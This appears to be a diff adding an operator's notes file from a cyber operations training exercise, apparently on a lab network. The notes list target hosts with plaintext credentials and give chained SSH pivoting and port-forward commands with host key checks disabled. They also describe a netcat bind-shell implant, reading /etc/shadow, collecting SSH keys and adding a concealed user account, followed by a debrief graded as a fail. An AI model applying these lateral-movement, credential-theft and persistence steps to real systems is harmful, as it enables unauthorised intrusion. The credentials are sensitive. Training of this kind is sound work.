@@ -1,0 +1,145 @@
+BELLIGERENTBADGER003
+2022-08-24
+>T1: 10.50.29.166
+->T2: 10.20.169.30
+-->T3: 10.20.169.239
+--->T4: 192.186.169.41
+---->T5: 192.186.169.201
+---->T6: 192.186.169.134
+---->T7: 192.186.169.144
+---->T8: 192.186.169.142
+
+
+T1:
+Hostname: EXT_RTR
+IP: 10.50.29.166 // 10.20.169.33
+OS: Linux v. unknown
+Creds: engineer#::enshallah
+Last Known SSH Port: 10123
+#################################ssh key confirm with MC###################################################
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer4@10.50.29.166 -p 10123
+enshallah
+
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T2
+Hostname: STORAGE2
+IP:  10.20.169.30
+OS: Windows v unknown
+Creds: caisson#::tread_depth
+Last Known SSH Port: 52203
+#################################ssh key confirm with MC###################################################
+ssh -S /tmp/T1 bad -O forward -L 2222:10.20.169.30:52203
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson4@localhost
+tread_depth
+
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T3:
+Hostname: Vyos2
+IP: 10.20.169.239
+OS: Vyos
+Creds: NOC_Admin#::AhmdLxu29D
+Last Known SSH Port: 52230
+#################################ssh key confirm with MC###################################################
+ssh -S /tmp/T2 bad -O forward -L 3333:10.20.169.239:52230
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin4@localhost
+AhmdLxu29D
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T4:
+Hostname: ADMIN2
+IP: 192.186.169.41
+OS: CentOS 7
+Creds: askar#::DaXedayLasarah
+Last Known SSH Port: Ask Analyst
+#################################ssh key confirm with MC###################################################
+ssh -S /tmp/T3 bad -O forward -L 4444:192.186.169.41:33157
+ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah
+Action: Perform SSH masquerade with credentials successful in previous operation. Report any new files of interest. Collect ssh keys for your “askar#” user for access to T8 if not already recorded from previous operations. Maneuver to next target.
+
+
+
+T5:
+Hostname: DESKTOP-USER21
+IP: 192.186.169.201 & 129.168.169.201
+OS: Linux v Ubuntu 18.04
+Creds: N/A
+Last Known SSH Port: None
+#################################ssh key confirm with MC###################################################
+ssh -S /tmp/T4 bad -O forward -L 5555:192.186.169.201:4474
+nc localhost 5555
+Action: Perform netcat connection via port 447#. If not conducted previously, perform @@device survey. Confirm with analyst regarding bypassing survey commands with large outputs that may bog down netcat connection. Catalog any user accounts and record applicable login data. Maneuver to next target.
+**Note: The processes “ncat -knvlp 447# -e /bin/sh” is your entry point and should not be treated as malware.
+
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@DISCONNECT before T6@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@2
+
+T6:  
+Hostname: Unknown
+IP: 192.186.169.134
+OS: Linux v Unknown
+Creds: Unknown - Request analyst input
+Last Known SSH Port: 33715
+#################################ssh key confirm with MC###################################################
+ssh -S /tmp/T4 bad -O forward -L 6666:192.186.169.134:33715
+ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, perform @@device survey. Maneuver to next target.
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@DISCONNECT before T6@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@2
+
+T7:  
+Hostname: Unknown
+IP: 192.186.169.144
+OS: Windows v Unknown
+Creds: Unknown - Request analyst input
+Last Known SSH Port: 33715
+#################################ssh key confirm with MC###################################################
+ssh -S /tmp/T4 bad -O forward -L 7777:192.186.169.144:33715
+ssh -MS /tmp/T7 -p 7777 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah4
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, perform device survey. Maneuver to next target.
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@DISCONNECT before T6@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@2
+
+T8:  
+Hostname: DESKTOP-USER24
+IP: 192.186.169.142
+OS: Linux v Unknown
+Creds: Previously collected ssh key
+Last Known SSH Port: 33715
+#################################ssh key confirm with MC###################################################
+https://mqt.gitbook.io/oscp-notes/ssh-keys
+ssh -S /tmp/T4 bad -O forward -L 8888:192.186.169.142:33715
+ssh -MS /tmp/T8 -p 8888 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./ssh_keys/id_rsa askar4@localhost
+
+Action: Perform SSH masquerade with previously collected SSH keys. If successful, perform device survey. If device is confirmed to be "DESKTOP-USER24" workstation, review /etc/passwd, /etc/shadow, and /etc/group to identify common user profile requirements. Execute T10 Effect and add a user account as outlined in Prior Approvals section. Su into created user to verify creation. Conclude operation.
+
+T10 Effect Note: Ignore other students when determining what standard users look like.
+
+
+DEBRIEF 
+
+Operator: 1LT An
+
+Operation: BELLIGERENTBADGER03
+
+MC: mc1
+
+Analyst: analyst2
+
+Description: BELLIGERENTBADGER is a C-ISR mission profile. The main objective was to add a user to T8 device. On T1, we redirected to T2. On T2, we redirected to T3. On T3, we redirected to T4. On T4, we already collected the ssh key on a previous mission, so we moved on. On T5, we used the netcat implant to gain access to T5. Once we gained access, we were able to conduct a device survey that we were not able to do on a previous mission. We also obtained user account information. We got off T5 and redirected to T6 from T4. On T6, we performed a device survey, and moved on. On T7, we also performed a device survey and moved on. On T8, we used the collected ssh keys from T4 to authenticate to T8. On T8, we conducted a device survey and we were able to create a user that blended with all the other users on the device. The user was created successfully and it can be used for FUOPs. Overall, the operation was successful. 
+
+
+
+Result: Fail
+-Effect not properly delivered
+-plaintext password meaning account cannot be accessed, not in priv user group
+
+
